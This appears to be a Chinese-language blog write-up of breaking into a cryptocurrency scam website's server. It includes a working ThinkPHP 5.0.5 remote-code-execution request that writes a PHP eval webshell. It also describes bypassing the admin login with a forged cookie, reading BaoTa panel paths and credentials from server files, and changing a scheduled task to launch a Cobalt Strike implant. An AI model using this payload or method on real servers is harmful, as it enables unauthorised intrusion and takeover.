最近，我偶然发现了一个虚拟货币买入和下跌的屠宰盘，并进行了一系列测试。前台看起来像这样。

![](../Images/f46adff66adff62aa60ef10bff578d0e.png)

为thinkphp5.0.5随用RCE进行打入，成功写入webshell。

```
s=index|think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=assert&vars\[1\]\[\]=@file\_put\_contents(base64\_decode(MTIzNDUucGhw),base64\_decode(MTI8P3BocCBldmFsKEAkX1BPU1RbJ2EnXSk7))

```

检查phpinfo信息后，发现可以执行系统命令的所有功能均已禁用，并且无法加载com和dl。如下所示，无法执行相应的系统命令：

![](../Images/a7350271f2517026b37c2ba1a40e1ca3.png)

```
assert,system,passthru,exec,pcntl\_exec,shell\_exec,popen,proc\_open
//php如上系统命令都已禁用

```

但是，文件的读写权限不会禁用assert（），file\_put\_contents（）和其他功能。检查后，发现Windows系统如下：

![](../Images/420efaf1075853c44d983533b5884d2a.png)

由于禁用了php执行系统命令的功能，因此很难无法执行系统命令。然后，我下载了他网站的源代码并对其进行了简短的查看，发现其管理员cookie是固定的，可以伪造。看起来像后门，如下所示：

![](../Images/dda0c9d78e6154e01caf4d5146b3245a.png)

因此，可以绕过后台登录，修复了管理员cookie，并可以添加cookie字段来绕过登录。浏览器f12，在cookie中添加上述键值访问索引，您可以成功登录到后台，如下所示。很多钱（很多人被骗）：

![](../Images/179d902a0072bb3321f0a40d2ba7f6a3.png)

前台要求客服了解转账（杀盘的操作方法是，用户将钱存入客服提供的账户后，再将相应的资金值冲入账户中）。后台审阅，并且审阅后可以使用该值Money用于货币的起伏，投资交易），并作为证据提交：

![](../Images/d70eb1aa5468f8adcdf6020642e047d7.png)

由于以前无法执行系统命令，因此，如果我想突破，便开始浏览他服务器上的文件。我阅读了系统文件，并找到了存在宝塔的文件夹。检测发现端口8888确实是开放的，并且有一个宝塔服务，但是默认的登录条目已被修改，如下所示：

![](../Images/22b7ada86c867cf36171e4cec85665fe.png)

翻阅宝塔文件发现存储路径的文件名admin\_path.pl，如下所示：

![](../Images/4282d04cefc80aaa2dc77365ec2534a5.png)

找到宝塔登录入口，成功访问该登录入口，如下所示：

![](../Images/0afb0d0e90a1d89e49b92c304d2c638e.png)

继续翻阅发现一个default.pl的文件，该文件中存放的是相应的登录密码：

![](../Images/c31c3e456afd31056c546a96d3375660.png)

拿到密码尝试了默认用户名发现不对不能登录，继续翻文件default.db文件是记录登录记录的找到登录账号：

![](../Images/36c9be5925c21e8161ec8e1eb0de59d6.png)

利用账号密码成功登录宝塔管理后台，如下所示：利用账号密码成功登录宝塔管理后台，如下所示：

![](../Images/4a7f695a675601773e92048113f23863.png)

找到定时任务处修改计划任务执行cs上线马，上线后在将计划任务改回如下所示：

  

![](../Images/662e2bc391e5bf4db8ebdd4f58a6edaf.png)

cs成功上线如下所示：

![](../Images/1f44245199d2b383f6254a6689f341bb.png)

查看ip仅有公网地址无内网，同C段还有其他几台部署的都是同一套东西就不在往下搞了：

![](../Images/d005daf8cc91cd92ebf74603668a5407.png)

总的就这样，没啥东西比较无味。
